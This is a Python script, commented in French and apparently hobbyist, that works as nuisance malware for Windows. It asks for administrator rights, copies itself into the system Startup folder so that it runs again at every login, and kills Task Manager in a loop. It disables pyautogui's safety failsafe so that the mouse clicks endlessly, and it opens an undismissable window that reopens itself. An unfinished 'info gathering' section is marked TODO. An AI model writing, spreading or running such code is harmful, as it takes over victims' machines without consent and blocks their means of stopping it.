# copyright boustifaille
import ctypes
import os
import random
import subprocess
import sys
import time
import tkinter as t
from threading import Thread
import shutil

# =========== Partie 1 : infermable =================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def is_taskmgr():
    content = subprocess.Popen("tasklist", 
           stderr=subprocess.PIPE, stdout=subprocess.PIPE).communicate()[0] 
    if b"Taskmgr.exe" in content:
        return True
    else:
        return False

def kill_taskmgr():
    while True:
        if is_taskmgr():
            subprocess.call("taskkill /im taskmgr.exe") 
        time.sleep(1)

def partir():
    while True:
        pyautogui.moveTo(int(l)/2, 50)
        pyautogui.click()
                             # mettre une sécurité

def copytostartup():
    src = os.path.abspath(__file__)
    dest = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
    shutil.copy(src, dest)
# ============== Partie 2 : récup infos ==================

# TODO

# ================ Partie principale =====================

def main():
    dimension = ("x").join([l, h])
    dimension = dimension+"+0+0"
    root = t.Tk()
    root.geometry(dimension)


    yo = t.Button(root, text="Yo", justify="center", command=lambda: main())
    
    msg = t.Label(root, text="Cheh", font="big")
    yo.pack()
    msg.pack()
    root.protocol("WM_DELETE_WINDOW", main)

    root.mainloop()



if __name__ == "__main__":
    try :
        import pyautogui
        pyautogui.FAILSAFE = False  # sécurité

    except ModuleNotFoundError:
        os.system("pip install pyautogui")

    if is_admin():
        tailles = range(10, 1920)
        l = str(random.choice(tailles))
        h = str(random.choice(tailles))
        copytostartup() # !!!!!!!!!!!!!!!!!!!!!!
        background_thread = Thread(target=kill_taskmgr, args=())
        background_thread.start()
        background_thread2 = Thread(target=partir, args=())
        background_thread2.start()

        main()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # relancer le programme avec les droits d'admin
